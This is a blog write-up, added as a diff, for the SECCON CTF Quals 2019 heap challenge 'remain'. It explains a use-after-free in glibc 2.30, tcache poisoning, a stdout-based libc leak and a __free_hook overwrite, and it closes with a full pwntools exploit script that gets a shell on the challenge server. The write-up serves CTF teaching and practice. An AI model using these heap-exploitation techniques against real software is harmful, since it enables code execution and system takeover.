@@ -1,0 +1,491 @@
+<!doctype html>
+<html lang="">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>remain - SECCON CTF Quals 2019 - slashb4sh</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="">
+    <meta property="og:site_name" content="slashb4sh" />
+    <meta property="og:locale" content="nn_NO" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="/blog/remain/" />
+    <meta property="og:title" content="remain - SECCON CTF Quals 2019" />
+    <meta property="og:image" content="/" />
+    <meta property="og:description" content="" />
+
+    
+        <meta property="twitter:site" content="@twitter.com/slashb4sh">
+    
+
+    <meta property="twitter:title" content="remain - SECCON CTF Quals 2019" />
+    <meta property="twitter:image" content="/" />
+    <meta property="twitter:card" content="summary" />
+    <meta property="twitter:description" content="" />
+
+    
+
+    <link rel="canonical" href="/blog/remain/">
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="/css/main.css" />
+
+    
+        <link rel="stylesheet" href="/css/highlight.css" />
+    
+
+    
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.css" integrity="sha256-xbqLYBMsjpuCihs+3Fgp/MFMtPdo2SWKoOjEWOqR4X0=" crossorigin="anonymous" />
+    
+
+    <link rel="shortcut icon"
+          href="/img/favicon.ico">
+
+    <link href='' rel="alternate" type="application/rss+xml" title="slashb4sh" />
+    <link href="https://fonts.googleapis.com/css?family=Fira+Code|Merriweather+Sans:400,700|Merriweather:400,700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    
+    
+
+    
+
+    
+
+<div class="my-4 my-md-5 header">
+    <div class="container">
+        <div class="row">
+            <div class="col-auto d-none d-md-block">
+                
+            </div>
+            <div class="col-auto align-self-center mr-auto">
+                <a href="/">
+                    <h1 class="font-weight-bold name">
+                        slashb4sh
+                    </h1>
+                </a>
+
+                <ul class="nav nav-primary">
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-blog" href="/blog/">
+                                
+                                Blog
+                            </a>
+                        </li>
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-about" href="/about/">
+                                
+                                About
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+
+                <ul class="nav nav-secondary">
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div class="content">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    <h1 class="mx-0 mx-md-4">
+                        remain - SECCON CTF Quals 2019
+                    </h1>
+
+                    <div class="mb-4 mb-md-5 meta">
+                        <span class="date" title='Sun Oct 20 2019 15:00:00 UTC'>
+                            October 20, 2019
+                        </span>
+
+                        
+                            
+                        
+
+                        <span class="reading-time middot">
+                            5 minutes
+                        </span>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/ctf">CTF</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/writeup">writeup</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/pwn">Pwn</a>
+                                    </li>
+                                
+                            </ul>
+                        </div>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="markdown">
+                        
+    
+    <p>linux heap exploitation challenge with glibc 2.30</p>
+<!-- raw HTML omitted -->
+<p><strong>Challenge points</strong>: 418
+<strong>No. of solves</strong>: 19</p>
+<p>A glibc heap Note challenge</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">Remain
+MENU
+<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span>
+<span style="color:#ae81ff">1.</span> Add
+<span style="color:#ae81ff">2.</span> Edit
+<span style="color:#ae81ff">3.</span> Delete
+<span style="color:#ae81ff">0.</span> Exit
+<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#f92672">*</span>
+<span style="color:#f92672">&gt;</span> 
+</code></pre></div><p>Add</p>
+<ul>
+<li>malloc(0x48), fixed size</li>
+<li>read input into chunk</li>
+<li>check if space available in table[10]</li>
+<li>if full are there, then free chunk, else add to table</li>
+</ul>
+<p>Edit</p>
+<ul>
+<li>Edit a chunk with size as strlen(content in the given table idx)</li>
+</ul>
+<p>Delete</p>
+<ul>
+<li>Free a table[idx]</li>
+<li>table[idx] not nulled out, leading to <code>Use after Free</code></li>
+</ul>
+<p>glibc 2.30 has double free check just like 2.29
+The tcache structure&rsquo;s address is used as cookie in a freed chunk in tcache. When a chuunk is freed ino the tcache.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> __always_inline <span style="color:#66d9ef">void</span>
+<span style="color:#a6e22e">tcache_put</span> (mchunkptr chunk, size_t tc_idx)
+{
+  tcache_entry <span style="color:#f92672">*</span>e <span style="color:#f92672">=</span> (tcache_entry <span style="color:#f92672">*</span>) chunk2mem (chunk);
+
+  <span style="color:#75715e">/* Mark this chunk as &#34;in the tcache&#34; so the test in _int_free will
+</span><span style="color:#75715e">     detect a double free.  */</span>
+  e<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>key <span style="color:#f92672">=</span> tcache;
+
+  e<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>next <span style="color:#f92672">=</span> tcache<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>entries[tc_idx];
+  tcache<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>entries[tc_idx] <span style="color:#f92672">=</span> e;
+  <span style="color:#f92672">+</span><span style="color:#f92672">+</span>(tcache<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>counts[tc_idx]);
+}
+</code></pre></div><p>With subsequent free, if the key value is equal to tcache structure&rsquo;s address, then all the chunks in the tcache linked list of the particular size is checked in a loop for double free.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	tcache_entry <span style="color:#f92672">*</span>e <span style="color:#f92672">=</span> (tcache_entry <span style="color:#f92672">*</span>) chunk2mem (p);
+	<span style="color:#66d9ef">if</span> (__glibc_unlikely (e<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>key <span style="color:#f92672">=</span><span style="color:#f92672">=</span> tcache))
+	  {
+	    tcache_entry <span style="color:#f92672">*</span>tmp;
+	    LIBC_PROBE (memory_tcache_double_free, <span style="color:#ae81ff">2</span>, e, tc_idx);
+	    <span style="color:#66d9ef">for</span> (tmp <span style="color:#f92672">=</span> tcache<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>entries[tc_idx];
+		 tmp;
+		 tmp <span style="color:#f92672">=</span> tmp<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>next)
+	      <span style="color:#66d9ef">if</span> (tmp <span style="color:#f92672">=</span><span style="color:#f92672">=</span> e)
+		malloc_printerr (<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">free(): double free detected in tcache 2</span><span style="color:#e6db74">&#34;</span>);
+	    <span style="color:#75715e">/* If we get here, it was a coincidence.  We&#39;ve wasted a
+</span><span style="color:#75715e">	       few cycles, but don&#39;t abort.  */</span>
+	  }
+</code></pre></div><p>Since we have use after free in edit function, we can overwrite the key to bypass the check,&hellip; oops wait a minute, the edit function uses strlen to get the size of the edit which means bypass is not easy.</p>
+<p>But we still can change the next pointer of a freed tcache chunk, giving an <code>arbitary write in the heap</code> by partialy overwriting freed chunk&rsquo;s next pointer.</p>
+<h4 id="exploitation">Exploitation</h4>
+<p>Since there is no show function, we will have to overwrite the stdout file structure to leak libc addresses. This directed my ideas to getting a parial overwrite to a freed tcache chunk with a libc address as the next pointer.</p>
+<p>The size is fixed to 0x48, filling the tcache with these chunk will only put them in fastbin. We have to change the size of the chunk and then free it to get libc address as fd.
+Remember that pointers in the table are not nulled out, so we have to finish the exploit with 10 allocations.</p>
+<p>After a lot of thinking, this is what I came up with,</p>
+<ul>
+<li>use the partial overwrite to get write to the tcache structure</li>
+<li>overwrite the count for the 0xa0 chunk to 0x7 in the tcache structure</li>
+<li>now, when we free a 0xa0 chunk it will be inserted into the unsorted bin</li>
+<li>To free a 0xa0 chunk we partially overwrite the fd of free chunk to point above the first chunk allocated so as to overwrite the size.</li>
+<li>Set the size as 0x51 itself and free it once</li>
+<li>Change the size to 0xa1 and free it, I chose to overwrite with 0xa0, as the next chunk size fields will be already set and chunk will be inserted into the unsorted bin without any hazzles.</li>
+<li>As we have a free tcache chunk pointing to a libc address, partially overwrite the libc address to point to stdout.</li>
+<li>Overwrite the <code>stdout-&gt;flags</code> with <code>0xfbad1800</code> and partiallly overwrite the <code>write_base</code> to <code>\x00</code> to dump a region of memory with the next puts call.</li>
+<li>Now overwrite the fd of a free tcache chunk to get overwrite <code>__free_hook</code></li>
+</ul>
+<p>Following all these steps I had already consumed 9 allocations out of the possible 10.
+But I need two more allocations to write <code>system</code> to <code>__free_hook</code>
+Looking at the add functions again, we can notice that an allocation is made, our input is read into it and then free is called if table is full. This satisfies our requiredments perfectly.
+Use the 10th allocation, and then 11th one to overwrite <code>__free_hook</code>. <code>system</code> is called for us within add functionality and we get shell :)</p>
+<p>**Note: ** There is a 4 bit bruteforce for tcache structure and another 4 bit bruteforce to get stdout. Luckily I got shell in remote server in the 4th or 5th try.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#75715e">#s=process(&#34;./rem&#34;,env={&#39;LD_PRELOAD&#39; : &#39;./libc.so.6&#39;})</span>
+s<span style="color:#f92672">=</span>remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">remain.chal.seccon.jp</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">27384</span>)
+libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./libc.so.6</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(data):
+    s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#34;</span>, str(<span style="color:#ae81ff">1</span>))
+    s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Input memo &gt; </span><span style="color:#e6db74">&#34;</span>, str(data))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, data):
+    s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#34;</span>, str(<span style="color:#ae81ff">2</span>))
+    s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Input id &gt; </span><span style="color:#e6db74">&#34;</span>, str(idx))
+    s<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Input new memo &gt; </span><span style="color:#e6db74">&#34;</span>, str(data))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
+    s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#34;</span>, str(<span style="color:#ae81ff">3</span>))
+    s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Input id &gt; </span><span style="color:#e6db74">&#34;</span>, str(idx))
+
+
+<span style="color:#75715e"># allocate tcache struct and overwrite the count for 0xa0 chunk with 0x7 </span>
+<span style="color:#75715e"># when we free 0xa0 chunk, it will be inserted into the unsorted bin</span>
+add(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x51</span>))
+add(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x21</span>))
+free(<span style="color:#ae81ff">0</span>)
+free(<span style="color:#ae81ff">1</span>)
+edit(<span style="color:#ae81ff">1</span>,p16(<span style="color:#ae81ff">0x7000</span>)) <span style="color:#75715e"># partially overwrite to point to tcache structure (4-bit bruteforce)</span>
+add(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span>)
+add(p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x291</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x0000000000000000</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x0707070707070707</span>))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">tcache structure written</span><span style="color:#e6db74">&#34;</span>)
+
+free(<span style="color:#ae81ff">0</span>)
+free(<span style="color:#ae81ff">1</span>)
+edit(<span style="color:#ae81ff">1</span>,p8(<span style="color:#ae81ff">0x90</span>)) <span style="color:#75715e"># partially overwrite to point above chunk 1</span>
+add(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span>)
+add(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x51</span>)) <span style="color:#75715e"># size edit primitive established</span>
+add(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span>) <span style="color:#75715e"># chunk allocated to prevent coallesing</span>
+free(<span style="color:#ae81ff">6</span>)
+free(<span style="color:#ae81ff">0</span>)
+edit(<span style="color:#ae81ff">5</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa1</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># set size as 0xa0 </span>
+free(<span style="color:#ae81ff">0</span>)
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">freed 0xa0 chunk</span><span style="color:#e6db74">&#34;</span>)
+
+edit(<span style="color:#ae81ff">0</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0</span><span style="color:#ae81ff">\x16</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># partially ovewrite freed chunk</span>
+add(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span>)
+add(p64(<span style="color:#ae81ff">0xfbad1800</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x00</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x20</span>)
+base <span style="color:#f92672">=</span> u64(s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>))<span style="color:#f92672">-</span><span style="color:#ae81ff">0x3b5a60</span>
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">libc = </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(base))
+free_hook <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__free_hook</span><span style="color:#e6db74">&#39;</span>]
+malloc_hook <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__malloc_hook</span><span style="color:#e6db74">&#39;</span>]
+system <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>]
+
+edit(<span style="color:#ae81ff">5</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51</span><span style="color:#e6db74">&#34;</span>)
+free(<span style="color:#ae81ff">0</span>) 
+free(<span style="color:#ae81ff">1</span>)
+edit(<span style="color:#ae81ff">1</span>,p64(free_hook<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>])
+add(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span>)
+add(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> p64(system))
+s<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">cat flag.txt</span><span style="color:#e6db74">&#34;</span>)
+
+s<span style="color:#f92672">.</span>interactive()
+</code></pre></div>
+
+
+                    </div>
+                </div>
+
+                
+                    <div class="col-sm-12 col-md-3">
+                        <nav id="TableOfContents" class="sticky-top">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                    </div>
+                
+            </div>
+
+            <div class="row">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    
+                        <div class="navigation">
+                            <div class="row">
+                                <div class="col-12 col-md-6">
+                                    
+                                        <div class="mx-0 mx-md-4 mt-4 text-left">
+                                            <a href="/blog/bartender/">
+                                                <span class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175">
+        <path d="M145.188,238.575l215.5-215.5c5.3-5.3,5.3-13.8,0-19.1s-13.8-5.3-19.1,0l-225.1,225.1c-5.3,5.3-5.3,13.8,0,19.1l225.1,225 c2.6,2.6,6.1,4,9.5,4s6.9-1.3,9.5-4c5.3-5.3,5.3-13.8,0-19.1L145.188,238.575z" />
+    </svg>
+</span>
+
+                                                <span class="text">bartender - InCTF Internationals 2019</span>
+                                            </a>
+                                        </div>
+                                    
+                                </div>
+                                <div class="col-12 col-md-6">
+                                    
+                                        <div class="mx-0 mx-md-4 mt-4 text-right">
+                                            <a href="/blog/schnurtelefon/">
+                                                <span class="text">Schnurtelefon - Hack.lu CTF 2019</span>
+                                                <span class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175">
+        <path d="M360.731,229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1,0s-5.3,13.8,0,19.1l215.5,215.5l-215.5,215.5 c-5.3,5.3-5.3,13.8,0,19.1c2.6,2.6,6.1,4,9.5,4c3.4,0,6.9-1.3,9.5-4l225.1-225.1C365.931,242.875,365.931,234.275,360.731,229.075z" />
+    </svg>
+</span>
+
+                                            </a>
+                                        </div>
+                                    
+                                </div>
+                            </div>
+                        </div>
+                    
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="my-4 footer">
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 mb-2 text-center text-md-left">
+                    
+
+                    
+                </div>
+            </div>
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 text-center text-md-right">
+                    
+
+                    
+
+                    
+    <a href="https://github.com/github.com/maheshhari"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="GitHub">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M8 0C3.58 0 0 3.582 0 8c0 3.535 2.292 6.533 5.47 7.59.4.075.547-.172.547-.385 0-.19-.007-.693-.01-1.36-2.226.483-2.695-1.073-2.695-1.073-.364-.924-.89-1.17-.89-1.17-.725-.496.056-.486.056-.486.803.056 1.225.824 1.225.824.714 1.223 1.873.87 2.33.665.072-.517.278-.87.507-1.07-1.777-.2-3.644-.888-3.644-3.953 0-.873.31-1.587.823-2.147-.09-.202-.36-1.015.07-2.117 0 0 .67-.215 2.2.82.64-.178 1.32-.266 2-.27.68.004 1.36.092 2 .27 1.52-1.035 2.19-.82 2.19-.82.43 1.102.16 1.915.08 2.117.51.56.82 1.274.82 2.147 0 3.073-1.87 3.75-3.65 3.947.28.24.54.73.54 1.48 0 1.07-.01 1.93-.01 2.19 0 .21.14.46.55.38C13.71 14.53 16 11.53 16 8c0-4.418-3.582-8-8-8"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+    <a href="https://twitter.com/twitter.com/slashb4sh"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Twitter">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M16 3.038c-.59.26-1.22.437-1.885.517.677-.407 1.198-1.05 1.443-1.816-.634.37-1.337.64-2.085.79-.598-.64-1.45-1.04-2.396-1.04-1.812 0-3.282 1.47-3.282 3.28 0 .26.03.51.085.75-2.728-.13-5.147-1.44-6.766-3.42C.83 2.58.67 3.14.67 3.75c0 1.14.58 2.143 1.46 2.732-.538-.017-1.045-.165-1.487-.41v.04c0 1.59 1.13 2.918 2.633 3.22-.276.074-.566.114-.865.114-.21 0-.41-.02-.61-.058.42 1.304 1.63 2.253 3.07 2.28-1.12.88-2.54 1.404-4.07 1.404-.26 0-.52-.015-.78-.045 1.46.93 3.18 1.474 5.04 1.474 6.04 0 9.34-5 9.34-9.33 0-.14 0-.28-.01-.42.64-.46 1.2-1.04 1.64-1.7z" fill-rule="nonzero"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+
+                    
+
+                    
+    <a href="mailto:maheshpdm2@gmail.com"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Email">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 16">
+            <path d="M0 4v8c0 .55.45 1 1 1h12c.55 0 1-.45 1-1V4c0-.55-.45-1-1-1H1c-.55 0-1 .45-1 1zm13 0L7 9 1 4h12zM1 5.5l4 3-4 3v-6zM2 12l3.5-3L7 10.5 8.5 9l3.5 3H2zm11-.5l-4-3 4-3v6z"/>
+        </svg>
+    </a>
+
+
+                    <a href=''
+    class="mx-1 ml-md-2 mr-md-0 icon"
+    aria-label="RSS">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+        <path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194 11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0 13.806c0-1.21.983-2.195 2.194-2.195zM10.606 16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"/>
+    </svg>
+</a>
+
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js" integrity="sha256-1zu+3BnLYV9LdiY85uXMzii3bdrkelyp37e0ZyTAQh0=" crossorigin="anonymous"></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/bash.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/css.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/diff.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/django.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/javascript.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/python.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/yaml.min.js" defer></script>
+        
+        <script>
+            window.addEventListener('load', function() {
+                hljs.initHighlighting();
+            }, true);
+        </script>
+    
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.js" integrity="sha256-LvFVlLdfGI3WeEH+8Ni4kxLm02g2GlOfeGCGLXfRk/U=" crossorigin="anonymous"></script>
+        <script>
+            window.addEventListener('load', function() {
+                progressively.init({delay: 30, throttle: 50});
+            }, true);
+        </script>
+    
+
+    
+
+    
+    
+</body>
+
+</html>
